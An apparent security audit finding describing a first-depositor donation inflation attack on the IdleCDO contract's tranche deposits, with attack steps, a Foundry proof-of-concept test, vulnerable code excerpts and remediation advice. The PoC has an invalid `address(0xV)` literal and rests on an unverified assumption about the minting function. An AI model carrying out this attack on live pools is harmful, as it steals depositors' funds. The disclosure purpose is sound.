### Title
First-depositor share-price inflation via direct token donation in `IdleCDO._deposit` — ([File: contracts/IdleCDO.sol])

### Summary
`IdleCDO` computes tranche share price from `getContractValue()`, which includes the raw unlent `token` balance held by the contract (`_contractTokenBalance(token)`). Because donated underlyings raise the NAV, the classic Solmate-style first-depositor / donation inflation attack applies: an attacker who is the first (or only) holder of a tranche can deposit a dust amount, donate underlying tokens directly to the `IdleCDO` contract to inflate `priceAA`/`priceBB`, and cause subsequent depositors to be minted ~0 tranche tokens while their transferred principal is captured in the inflated NAV and redeemed by the attacker.

### Finding Description
`getContractValue()` counts the contract's free `token` balance directly in NAV: [1](#0-0) 

On deposit, `_deposit` calls `_updateAccounting()` *before* pulling the user's funds, then mints shares at the post-donation tranche price via `_mintSharesAtCurrPrice`: [2](#0-1) 

Attack sequence (running phase, any tranche pool with empty or near-empty tranche supply on one side, e.g. BB):

1. Attacker calls `depositBB(1)` (dust). `BB` supply ≈ 1 wei, `lastNAVBB` ≈ 1.
2. Attacker `ERC20(token).transfer(idleCDO, D)` — a large donation, e.g. 90% of the expected next deposit size. This sits in the unlent balance and is fully counted by `getContractValue()`. There is no donation-skim/isolation: `_updateAccounting` treats it as yield, splits it per `trancheAPRSplitRatio`, and pushes `priceBB` up by roughly `D`× since BB supply is 1 wei.
3. Victim calls `depositBB(X)` where `X < D`. `_minted = X * ONE_TRANCHE_TOKEN / priceBB` rounds to 0 (or dust) shares, while the full `X` tokens were already pulled in by `_transferUnderlyingsFrom`.
4. Attacker calls `withdrawBB(1)`: their single share now prices against a NAV of `1 + D + X`, recovering `D + X` — i.e., the victim's entire deposit.

The same path is reachable through `TrancheWrapper.deposit`/`mint`, whose `_deposit` delegates to `depositAA`/`depositBB` and mints wrapper shares equal to the tranche tokens received — a victim depositing through the wrapper likewise receives 0 wrapper shares. [3](#0-2) 

Existing guards do not stop this: `_checkDefault()` only checks the *strategy* price (not unlent balance), `whenNotPaused`/`_guarded` are irrelevant, and `unclaimedFees` only skims the configured `fee` percentage of the gain, leaving the bulk of the donation in tranche NAV. Note: I was unable to read `_mintSharesAtCurrPrice`'s exact body in the available iterations; the analysis assumes the standard `amount * 1e18 / price` mint with no zero-share or minimum-first-deposit check — this should be confirmed, but the inflation mechanism in `getContractValue` + `_updateAccounting` holds regardless.

### Impact Explanation
Direct theft of user deposits. For any tranche whose supply can be driven to dust (freshly deployed CDO, or a side fully redeemed), the first depositor can steal an arbitrarily large fraction — bounded only by the donation cost — of every subsequent deposit until share supply grows enough that minted shares stop rounding to dust. Loss ≈ victim deposit amount per victim.

### Likelihood Explanation
Requires a fresh/empty tranche side and a donation roughly comparable to the victim's deposit, so it is bounded to pool-bootstrap windows; in exchange the attacker needs no privileges (any EOA can deposit dust and transfer tokens). Well-known bug class, trivially reproducible.

### Recommendation
- Enforce a minimum initial deposit per tranche and/or mint-and-lock (or burn) dead shares on the first deposit so price cannot be inflated with 1-wei supply.
- Alternatively, exclude unexpected unlent donations from NAV: track an accounting balance updated only via `deposit`/`withdraw`/`harvest` (a `_skimDonatedAssets`-style reserve) instead of raw `balanceOf` in `getContractValue()`.
- Revert `_mintSharesAtCurrPrice` when `_minted == 0` for nonzero `_amount`.

### Proof of Concept
Foundry fork PoC outline (`test/foundry/`):

```solidity
function testFirstDepositorInflation() public {
    // idleCDO: live or freshly deployed IdleCDO with empty BB tranche
    address attacker = address(0xA);
    address victim = address(0xV);
    deal(token, attacker, 1 + 1_000_000e6);
    deal(token, victim, 1_000_000e6);

    // 1. dust deposit
    vm.prank(attacker);
    idleCDO.depositBB(1); // BB supply = 1 wei

    // 2. donation inflates getContractValue -> priceBB
    vm.prank(attacker);
    IERC20(token).transfer(address(idleCDO), 900_000e6);

    // 3. victim deposit mints ~0 shares
    vm.prank(victim);
    uint256 minted = idleCDO.depositBB(1_000_000e6);
    assertEq(minted, 0); // or dust

    // 4. attacker redeems dust share, captures donation + victim principal
    vm.prank(attacker);
    uint256 out = idleCDO.withdrawBB(1);
    assertGt(out, 1_800_000e6); // donation + victim deposit (minus fees)
}
```

Key assertion targets: `idleCDO.getContractValue()` jumps by the donation, `idleCDO.virtualPrice(BBTranche)` becomes ~`D * 1e18`, and the victim's minted tranche balance is 0 while `token.balanceOf(victim)` decreased by the full deposit.

    address _strategyToken = strategyToken;
    // TVL is the sum of unlent balance in the contract + the balance in lending - harvested but locked rewards - unclaimedFees
    // Balance in lending is the value of the interest bearing assets (strategyTokens) in this contract
    // TVL = (strategyTokens * strategy token price) + unlent balance - lockedRewards - unclaimedFees
    return (_contractTokenBalance(_strategyToken) * _strategyPrice() / (10**(IERC20Detailed(_strategyToken).decimals()))) +
            _contractTokenBalance(token) -
            _lockedRewards() -
            unclaimedFees;
  }

  function _deposit(uint256 _amount, address _tranche, address _referral) internal virtual whenNotPaused returns (uint256 _minted) {
    if (_amount == 0) {
      return _minted;
    }
    // check that we are not depositing more than the contract available limit
    _guarded(_amount);
    // set _lastCallerBlock hash
    _updateCallerBlock();
    // check if _strategyPrice decreased
    _checkDefault();
    // interest accrued since last depositXX/withdrawXX/harvest is splitted between AA and BB
    // according to trancheAPRSplitRatio. NAVs of AA and BB are updated and tranche
    // prices adjusted accordingly
    _updateAccounting();
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));

    if (directDeposit) {
      IIdleCDOStrategy(strategy).deposit(_amount);
    }

    if (_referral != address(0)) {
      emit Referral(_amount, _referral);
    }
  }
